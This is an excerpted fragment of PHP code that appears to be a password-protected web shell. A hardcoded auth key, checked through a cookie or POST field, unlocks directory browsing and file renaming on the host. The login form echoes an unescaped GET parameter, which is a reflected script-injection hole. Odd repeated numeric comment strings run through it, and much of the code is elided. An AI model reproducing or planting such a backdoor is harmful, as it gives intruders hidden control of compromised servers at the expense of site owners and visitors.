...
$auth_key = "83cbfa05d67df89af439842b3979650f";
...
$pass = false;
if (isset($_COOKIE['pw_name_13512'])) {
    if(($_COOKIE['pw_name_13512']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_13512'])) {
        if(($_POST['pw_name_13512']) == $auth_key) {
            setcookie("pw_name_13512", $_POST['pw_name_13512']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_13512' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725962101141387 1725962101150402 1725962101451151 1725962101828643
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725962101141387 1725962101150402 1725962101451151 1725962101828643
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725962101141387 1725962101150402 1725962101451151 1725962101828643
            $name = PATH . "/" . $_GET['r'];
